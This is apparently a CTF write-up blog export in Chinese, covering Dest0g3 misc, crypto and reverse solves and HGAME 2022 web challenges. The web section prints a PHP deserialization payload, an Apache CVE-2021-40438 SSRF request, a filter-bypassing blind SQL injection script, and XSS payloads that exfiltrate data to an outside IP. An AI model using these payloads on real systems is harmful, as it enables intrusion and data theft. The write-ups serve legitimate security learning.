title=\"Python_jail\"></a>Python_jail</h2><p>打开password发现whitespace语言，解密</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220527084339450.png\" alt=\"image-20220527084339450\"></p>\n<p>解压出图片 steg发现base64</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220527085501175.png\" alt=\"image-20220527085501175\"></p>\n<p>ZmxhZ3tiNWJj ZmM4Ny01Y2E2LTQz ZjEtYjM4NC01N2Qw OWI4ODZjYTl9u</p>\n<p>FLAG：flag{b5bcfc87-5ca6-43f1-b384-57d09b886ca9}</p>\n<h2 id=\"codegame\"><a href=\"#codegame\" class=\"headerlink\" title=\"codegame\"></a>codegame</h2><p>改后缀为zip，发现有 KEYcode文件，谷歌发现为 LOLCODE ：<a href=\"https://www.dcode.fr/lolcode-language\">https://www.dcode.fr/lolcode-language</a></p>\n<p>解密为：QEFPFPQEBMXPPTLOA</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220527003433109.png\" alt=\"image-20220527003433109\"></p>\n<p>解压出1.docx，foremost分离出docx</p>\n<p>打开发现 emojiaes</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220527005505784.png\" alt=\"image-20220527005505784\"></p>\n<p>解密的key就是压缩包密码：QEFPFPQEBMXPPTLOA，尝试偏移</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220527010321499.png\" alt=\"image-20220527010321499\"></p>\n<p>FLAG：flag{9f68f334-017a-4201-92df-dddcc145334d}</p>\n<h2 id=\"rookie-hacker-2\"><a href=\"#rookie-hacker-2\" class=\"headerlink\" title=\"rookie hacker-2\"></a>rookie hacker-2</h2><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/i-chunqiu/image-20220528153606640.png\" alt=\"image-20220528153606640\"></p>\n<p>accessdata在history中发现两个docker ip</p>\n<p>FLAG：Dest0g3{172.18.0.2_172.18.0.3}</p>\n<h1 id=\"CRYPTO\"><a href=\"#CRYPTO\" class=\"headerlink\" title=\"CRYPTO\"></a>CRYPTO</h1><h2 id=\"babyRSA\"><a href=\"#babyRSA\" class=\"headerlink\" title=\"babyRSA\"></a>babyRSA</h2><p>缺少p，q，Yafu分解质因数：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220527083459492.png\" alt=\"image-20220527083459492\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> libnum</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes</span><br><span class=\"line\"></span><br><span class=\"line\">e = <span class=\"number\">65537</span></span><br><span class=\"line\">n = <span class=\"number\">27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267</span></span><br><span class=\"line\">c = <span class=\"number\">14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># p和q是我们发现n比较小于是果断用工具分解质因数得到的</span></span><br><span class=\"line\">p = <span class=\"number\">165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973971467</span></span><br><span class=\"line\">q = <span class=\"number\">165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973969401</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">n = p * q</span><br><span class=\"line\">phi_n = (p-<span class=\"number\">1</span>)*(q-<span class=\"number\">1</span>)</span><br><span class=\"line\">d = libnum.invmod(e, phi_n)</span><br><span class=\"line\"></span><br><span class=\"line\">m = <span class=\"built_in\">pow</span>(c, d, n)</span><br><span class=\"line\">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>\n\n<p>FLAG：Dest0g3{96411aad-032c-20a8-bc43-b473f6f08536}</p>\n<h2 id=\"babyAES\"><a href=\"#babyAES\" class=\"headerlink\" title=\"babyAES\"></a>babyAES</h2><p>密文，key，偏移量都给了，直接转十六进制CyberChef 解密</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"></span><br><span class=\"line\">c = <span class=\"built_in\">str</span>(binascii.b2a_hex( <span class=\"string\">b&#x27;C4:\\x86Q$\\xb0\\xd1\\x1b\\xa9L\\x00\\xad\\xa3\\xff\\x96 hJ\\x1b~\\x1c\\xd1y\\x87A\\xfe0\\xe2\\xfb\\xc7\\xb7\\x7f^\\xc8\\x9aP\\xdaX\\xc6\\xdf\\x17l=K\\x95\\xd07&#x27;</span>))[<span class=\"number\">2</span>:-<span class=\"number\">1</span>]</span><br><span class=\"line\">key = <span class=\"built_in\">str</span>(binascii.b2a_hex(<span class=\"string\">b&#x27;\\xa4\\xa6M\\xab&#123;\\xf6\\x97\\x94&gt;hK\\x9bBe]F&#x27;</span>))</span><br><span class=\"line\">iv = <span class=\"built_in\">str</span>(binascii.b2a_hex( <span class=\"string\">b&#x27;\\xd1\\xdf\\x8f)\\x08w\\xde\\xf9yX%\\xca[\\xcb\\x18\\x80&#x27;</span>))</span><br><span class=\"line\">print(c)</span><br><span class=\"line\">print(key)</span><br><span class=\"line\">print(iv)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220527093824113.png\" alt=\"image-20220527093824113\"></p>\n<p>FLAG：Dest0g3{d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4}</p>\n<h1 id=\"REVERSE\"><a href=\"#REVERSE\" class=\"headerlink\" title=\"REVERSE\"></a>REVERSE</h1><h2 id=\"simpleXOR\"><a href=\"#simpleXOR\" class=\"headerlink\" title=\"simpleXOR\"></a>simpleXOR</h2><p>就是跟result_0进行异或</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220527090721767.png\" alt=\"image-20220527090721767\"></p>\n<p>result_0：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220527090754297.png\" alt=\"image-20220527090754297\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">result = [<span class=\"number\">0xB3</span>,<span class=\"number\">0x91</span>,<span class=\"number\">0x82</span>,<span class=\"number\">0x80</span>,<span class=\"number\">0xC3</span>,<span class=\"number\">0x9B</span>,<span class=\"number\">0xCE</span>,<span class=\"number\">0x75</span>,<span class=\"number\">0xCF</span>,<span class=\"number\">0x9C</span>,<span class=\"number\">0x9A</span>,<span class=\"number\">0x85</span>,<span class=\"number\">0x85</span>,<span class=\"number\">0xCD</span>,<span class=\"number\">0xB8</span>,<span class=\"number\">0x84</span>,<span class=\"number\">0xAA</span>,<span class=\"number\">0x7D</span>,<span class=\"number\">0xBD</span>,<span class=\"number\">0xBB</span>,<span class=\"number\">0xB1</span>,<span class=\"number\">0xB5</span>,<span class=\"number\">0x96</span>,<span class=\"number\">0x71</span>,<span class=\"number\">0x8D</span>,<span class=\"number\">0x9E</span>,<span class=\"number\">0x86</span>,<span class=\"number\">0xBF</span>,<span class=\"number\">0x73</span>,<span class=\"number\">0xA8</span>,<span class=\"number\">0xA3</span>,<span class=\"number\">0x9C</span>,<span class=\"number\">0x83</span>,<span class=\"number\">0x65</span>,<span class=\"number\">0x9E</span>,<span class=\"number\">0x57</span>]</span><br><span class=\"line\">flag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">leng = <span class=\"built_in\">len</span>(result)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(leng):</span><br><span class=\"line\">    flag += <span class=\"built_in\">chr</span>((result[i]^<span class=\"number\">247</span>)-i)</span><br><span class=\"line\">print(flag)</span><br></pre></td></tr></table></figure>\n\n<p>FLAG：Dest0g3{0bcgf-AdMy892-KobPW-hB6LTqG}</p>\n<h1 id=\"AI\"><a href=\"#AI\" class=\"headerlink\" title=\"AI\"></a>AI</h1><h2 id=\"OCR\"><a href=\"#OCR\" class=\"headerlink\" title=\"OCR\"></a>OCR</h2><p>爆破png宽高,CRC为0x36890ABE</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> zlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 同时爆破宽度和高度</span></span><br><span class=\"line\">filename = <span class=\"string\">&quot;misc34.png&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(filename, <span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    all_b = f.read()</span><br><span class=\"line\">    data = <span class=\"built_in\">bytearray</span>(all_b[<span class=\"number\">12</span>:<span class=\"number\">29</span>])</span><br><span class=\"line\">    n = <span class=\"number\">4095</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> w <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n):</span><br><span class=\"line\">        width = <span class=\"built_in\">bytearray</span>(struct.pack(<span class=\"string\">&#x27;&gt;i&#x27;</span>, w))</span><br><span class=\"line\">        <span class=\"keyword\">for</span> h <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n):</span><br><span class=\"line\">            height = <span class=\"built_in\">bytearray</span>(struct.pack(<span class=\"string\">&#x27;&gt;i&#x27;</span>, h))</span><br><span class=\"line\">            <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span>):</span><br><span class=\"line\">                data[x+<span class=\"number\">4</span>] = width[x]</span><br><span class=\"line\">                data[x+<span class=\"number\">8</span>] = height[x]</span><br><span class=\"line\">            crc32result = zlib.crc32(data)</span><br><span class=\"line\">            <span class=\"comment\">#替换成图片的crc</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> crc32result == <span class=\"number\">0x36890ABE</span>:</span><br><span class=\"line\">                print(<span class=\"string\">&quot;宽为：&quot;</span>, end = <span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">                print(width, end = <span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">                print(<span class=\"built_in\">int</span>.from_bytes(width, byteorder=<span class=\"string\">&#x27;big&#x27;</span>))</span><br><span class=\"line\">                print(<span class=\"string\">&quot;高为：&quot;</span>, end = <span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">                print(height, end = <span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">                print(<span class=\"built_in\">int</span>.from_bytes(height, byteorder=<span class=\"string\">&#x27;big&#x27;</span>))</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526184742732.png\" alt=\"image-20220526184742732\"></p>\n<p>宽为：bytearray(b’\\x00\\x00\\x07]’) 1885<br>高为：bytearray(b’\\x00\\x00\\x03\\x06’) 774</p>\n<p>TweakPNG修改宽高</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526184859674.png\" alt=\"image-20220526184859674\"></p>\n<p>发现为7z的文件格式头，在线OCR识别出来文本，转为7z文件</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526202220936.png\" alt=\"image-20220526202220936\"></p>\n<p>打开Dest0g3.txt</p>\n<p>FLAG：Dest0g3{34512098-3309-7712-8865-783460221647}</p>\n<h2 id=\"The-correct-flag\"><a href=\"#The-correct-flag\" class=\"headerlink\" title=\"The correct flag\"></a>The correct flag</h2><p>word显示所有标记</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526185710235.png\" alt=\"image-20220526185710235\"></p>\n<p>格式刷，刷出大量字符</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526193933899.png\" alt=\"image-20220526193933899\"></p>\n<p>做一下词频统计</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">alphabet = <span class=\"string\">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()\\_+-/=&#123;&#125;[] &quot;</span><span class=\"comment\">#所有正常打印字符</span></span><br><span class=\"line\">strings = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;123.txt&#x27;</span>).read()<span class=\"comment\">#读取需要统计频数的文本</span></span><br><span class=\"line\">word = strings.split()</span><br><span class=\"line\"></span><br><span class=\"line\">result = &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> word:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> i <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> result:</span><br><span class=\"line\">        result[i] = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        result[i] += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">res = <span class=\"built_in\">sorted</span>(result.items(), key=<span class=\"keyword\">lambda</span> item: item[<span class=\"number\">1</span>], reverse=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">f = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;out.txt&#x27;</span>,<span class=\"string\">&#x27;w&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">num = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> data <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">    num += <span class=\"number\">1</span></span><br><span class=\"line\">    print(<span class=\"string\">&#x27;频数第&#123;0&#125;: &#123;1&#125;&#x27;</span>.<span class=\"built_in\">format</span>(num, data))</span><br><span class=\"line\">    f.writelines(<span class=\"string\">&#x27;频数第&#123;0&#125;: &#123;1&#125;&#x27;</span>.<span class=\"built_in\">format</span>(num, data))</span><br><span class=\"line\">    f.write(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">f.close()</span><br><span class=\"line\">print(<span class=\"string\">&#x27;\\n---------------以下是频数从多到少的字符，按照从前到后排序---------------&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">    flag = <span class=\"built_in\">str</span>(i[<span class=\"number\">0</span>])</span><br><span class=\"line\">    print(flag[<span class=\"number\">0</span>], end=<span class=\"string\">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>搜索De关键字</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526194125598.png\" alt=\"image-20220526194125598\"></p>\n<p>词频为15</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526194210866.png\" alt=\"image-20220526194210866\"></p>\n<p>发现当词频最高时，前一个字母时候一个字母的开头</p>\n<p>FLAG：Dest0g3{2987NWqSdIl1}</p>\n<h1 id=\"BLOCKCHAIN\"><a href=\"#BLOCKCHAIN\" class=\"headerlink\" title=\"BLOCKCHAIN\"></a>BLOCKCHAIN</h1><h2 id=\"Where-the-flag？\"><a href=\"#Where-the-flag？\" class=\"headerlink\" title=\"Where the flag？\"></a>Where the flag？</h2><p>找到一个链接</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526181806512.png\" alt=\"image-20220526181806512\"></p>\n<p>点入其中一个发现flag，hex转字符串</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526182815960.png\" alt=\"image-20220526182815960\"></p>\n<p>FLAG：Dest0g3{0n1y_u5e_priv4t3_i5_n0t_s4f3_1n_B1okCh4in!}</p>\n<h2 id=\"Easy-predict\"><a href=\"#Easy-predict\" class=\"headerlink\" title=\"Easy predict\"></a>Easy predict</h2><p>hex转str直接出</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526183342989.png\" alt=\"image-20220526183342989\"></p>\n<p>FLAG：Dest0g3{thi5_1s_4_sup3r_e3ea5y_pe1d1ct_r1ght?}</p>\n","categories":["赛题wp"]},{"title":"HGAME 2022 WEB","url":"/2023/12/25/HGAME%202022%20WEB/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>web篇</p>\n<a id=\"more\"></a>\n\n<h1 id=\"Tetris-plus\"><a href=\"#Tetris-plus\" class=\"headerlink\" title=\"Tetris plus\"></a>Tetris plus</h1><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/2332d271e43d4cb196db39ac537489d1.png\"><br>直接搜索alert</p>\n<h1 id=\"Fujiwara-Tofu-Shop\"><a href=\"#Fujiwara-Tofu-Shop\" class=\"headerlink\" title=\"Fujiwara Tofu Shop\"></a>Fujiwara Tofu Shop</h1><p>添加一些头部信息，<strong>X-Real-IP: 127.0.0.1</strong></p>\n<h1 id=\"蛛蛛…嘿嘿♥我的蛛蛛\"><a href=\"#蛛蛛…嘿嘿♥我的蛛蛛\" class=\"headerlink\" title=\"蛛蛛…嘿嘿♥我的蛛蛛\"></a>蛛蛛…嘿嘿♥我的蛛蛛</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> lxml <span class=\"keyword\">import</span> etree</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&#x27;https://hgame-spider.vidar.club/be26bf4bdf&#x27;</span></span><br><span class=\"line\">r = requests.get(url).text</span><br><span class=\"line\">htmltxt = etree.HTML(r)</span><br><span class=\"line\">key = htmltxt.xpath(<span class=\"string\">&quot;//a/@href&quot;</span>)</span><br><span class=\"line\">Key = <span class=\"string\">&#x27;&#x27;</span>.join(key)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">110</span>):</span><br><span class=\"line\">    print(url+Key)</span><br><span class=\"line\">    r = requests.get(url+Key).text</span><br><span class=\"line\">    htmltxt = etree.HTML(r)</span><br><span class=\"line\">    key = htmltxt.xpath(<span class=\"string\">&quot;//a/@href&quot;</span>)</span><br><span class=\"line\">    Key = <span class=\"string\">&#x27;&#x27;</span>.join(key)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&#x27;game&#x27;</span> <span class=\"keyword\">in</span> r:</span><br><span class=\"line\">        print(<span class=\"string\">&quot;success!&quot;</span>+r)</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n<p>第100个包，头部信息</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/f69afd537d074c529e5442617a5f42ce.png\"></p>\n<h1 id=\"easy-auth\"><a href=\"#easy-auth\" class=\"headerlink\" title=\"easy_auth\"></a>easy_auth</h1><p>jwt没密钥直接换0</p>\n<h1 id=\"webpack-engine\"><a href=\"#webpack-engine\" class=\"headerlink\" title=\"webpack-engine\"></a>webpack-engine</h1><p>Webpack打包网站，细心点搜一下源码</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/f7199f6d21684d2e8f8392fe74983529.png\"><br>Flag: hgame{D0nt_f0r9et_2_ClOs3_S0urce_m@p}</p>\n<h1 id=\"一本单词书\"><a href=\"#一本单词书\" class=\"headerlink\" title=\"一本单词书\"></a>一本单词书</h1><p>username=adm1n&amp;password=1080a 弱比较绕过登录</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/545c000ff8014be195544f2d2f083f31.png\"></p>\n<p>save.php可以操作session文件</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/d3b8d4582ffd40a58cc15936013ad7f2.png\"></p>\n<p>get.php可以反序列化</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/5dc8322d49c548309e362a7cf25ef409.png\"></p>\n<p>由于数据处理时为 <strong>json_decode</strong> 所以 <strong>键值对的键可控</strong>，注入session文件，反序列化读取文件<br>Payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">\t&quot;y0ng|O:4:\\&quot;Evil\\&quot;:2:&#123;s:4:\\&quot;file\\&quot;;s:5:\\&quot;&#x2F;flag\\&quot;;s:4:\\&quot;flag\\&quot;;N;&#125;&quot;:1</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>访问get.php触发反序列化</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/849f44eb876e41808548fdd503f97c9d.png\"></p>\n<p>Flag：hgame{Uns@f3_D3seR1@liz4t1On!Is~h0rr1b1e-!n_PhP}</p>\n<h1 id=\"Apache\"><a href=\"#Apache\" class=\"headerlink\" title=\"Apache!\"></a>Apache!</h1><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/591bad95337b44ab9466d9aacd5f3bf0.png\"></p>\n<p>附件 Default.conf 发现 flag路径</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/b451702c8a48443f827f39a22e8cdc10.png\"></p>\n<p>搜索相关cve，2021 年 Apache 的 mod_proxy 模块报了个 SSRF 漏洞（CVE-2021-40438），<a href=\"https://www.anquanke.com/post/id/257657\">Apache httpd Server CVE-2021-40438 漏洞分析</a>， 用来ssrf探测内网，这题设置了 <strong>/proxy的代理服务</strong></p>\n<p>Payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET &#x2F;proxy?unix:A*6409|http:&#x2F;&#x2F;127.0.0.1:60010&#x2F;flag HTTP&#x2F;1.1</span><br><span class=\"line\">Host: 127.0.0.1:8787</span><br><span class=\"line\">User-Agent: curl&#x2F;7.64.1</span><br><span class=\"line\">Accept: *&#x2F;*</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/e155777b6d6742de842e8f56321e78c7.png\"></p>\n<p>Flag：hgame{COng@tul4ti0n~u_r3prOduced_CVE-2021-40438}</p>\n<h1 id=\"Pokemon\"><a href=\"#Pokemon\" class=\"headerlink\" title=\"Pokemon\"></a>Pokemon</h1><p>error.php二分法盲注，过滤 <strong>=</strong> 用 <strong>like</strong>绕过</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://121.43.141.153:60056/error.php?code=&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">result = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">i = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> (<span class=\"literal\">True</span>):</span><br><span class=\"line\">    i = i + <span class=\"number\">1</span></span><br><span class=\"line\">    head = <span class=\"number\">32</span></span><br><span class=\"line\">    tail = <span class=\"number\">127</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (head &lt; tail):</span><br><span class=\"line\">        mid = (head + tail) &gt;&gt; <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#payload = &quot;if(ascii(substr(database(),%d,1))&gt;%d,404,403)&quot; % (i , mid)</span></span><br><span class=\"line\">        payload = <span class=\"string\">&quot;if(ascii(substr((selselectect/*/**/*/flag/*/**/*/frfromom/*/**/*/fllllllllaaaaaag),%d,1))&gt;%d,404,403)&quot;</span> % (i, mid)</span><br><span class=\"line\">        <span class=\"comment\">#payload = &quot;if(ascii(substr((selselectect/*/**/*/group_concat(column_name)frfromom(infoorrmation_schema.columns)whwhereere(table_name/*/**/*/like/*/**/*/&#x27;fllllllllaaaaaag&#x27;)),%d,1))&gt;%d,404,403)&quot; % (i, mid)</span></span><br><span class=\"line\"></span><br><span class=\"line\">        r = requests.get(url + payload)</span><br><span class=\"line\">        <span class=\"comment\">#r.encoding = &quot;utf-8&quot;</span></span><br><span class=\"line\">        <span class=\"comment\"># print(url+payload)</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;404&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            head = mid + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"comment\"># print(r.text)</span></span><br><span class=\"line\">            tail = mid</span><br><span class=\"line\"></span><br><span class=\"line\">    last = result</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> head != <span class=\"number\">32</span>:</span><br><span class=\"line\">        result += <span class=\"built_in\">chr</span>(head)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    print(result)</span><br></pre></td></tr></table></figure>\n<p>Flag：hgame{C0n9r@tul4tiOn#Y0u$4r3_sq1_M4ST3R^}</p>\n<h1 id=\"At0m的留言板\"><a href=\"#At0m的留言板\" class=\"headerlink\" title=\"At0m的留言板\"></a>At0m的留言板</h1><ul>\n<li>xss</li>\n</ul>\n<p>给了一个html模板，发现flag在 <code>&lt;head&gt;</code> 标签中被定义</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/e1fc42e104514677929a03bf0c68cb9c.png\"></p>\n<p>题目环境是在微信平台，发送paylaod会返回代码执行的截图，禁用了一些常见xss，本来思路是让flag回显到平台，然后得到截图就行了，但是可能是截图太快，或者其他原因，不回显，所以只能外带数据</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/0b31b173ed8146ebac0a6c3f34c6d0a3.png\"></p>\n<p>以下是部分测试payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&lt;&#x2F;span&gt;&lt;img src&#x3D;”111” onerror&#x3D;alert(1)&gt;&lt;span&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;&#x2F;span&gt;&lt;a onload&#x3D;&quot;document.location&#x3D;&#39;http\\:&#x2F;&#x2F;150.158.181.145:8000&#x2F;?&#39;+flag;&quot;&gt;xss link\\&lt;&#x2F;a&gt;&lt;span&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;img src&#x3D;&quot;data:image&#x2F;png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAIAAAD8GO2jAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAYElEQVRIiWNcPD89JF9HRVRbMF0oJF9QT1NUWzFdKTs&#x2F;PliAgYHBc143k&#x2F;yPi9t+X9N9qif38ePJv1&#x2F;vBnyyMDBj2bln&#x2F;dk9G84yjIJRMApGwSgYBaNgFIyCUTAKhg0AAIGyGwIHeA0MAAAAAElFTkSuQmCC&quot; onload&#x3D;&quot;window.open(&#39;http\\:&#x2F;&#x2F;150.158.181.145:8000&#x2F;?&#39;+flag);&quot; width&#x3D;&quot;336&quot; height&#x3D;&quot;36&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\">&lt;span id&#x3D;&quot;msg&quot;&gt;&lt;video src&#x3D;&quot;111&quot; onerror&#x3D;&quot;document.getElementById(&#39;msg&#39;).innerHTML&#x3D;flag;&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;span id&#x3D;&quot;msg&quot;&gt;&lt;audio controls onloadeddate&#x3D;&quot;document.getElementById(&#39;msg&#39;).innerHTML&#x3D;flag;&quot;&gt;&lt;source src&#x3D;https:&#x2F;&#x2F;www.w3school.com.cn&#x2F;i&#x2F;horse.mp3 type&#x3D;&quot;audio&#x2F;mpeg&quot;&gt;&lt;&#x2F;audio&gt;&lt;&#x2F;span&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;span id&#x3D;&quot;msg&quot;&gt;&lt;audio controls oncanplay&#x3D;&quot;document.getElementById(&#39;msg&#39;).innerHTML&#x3D;flag;&quot;&gt;&lt;source 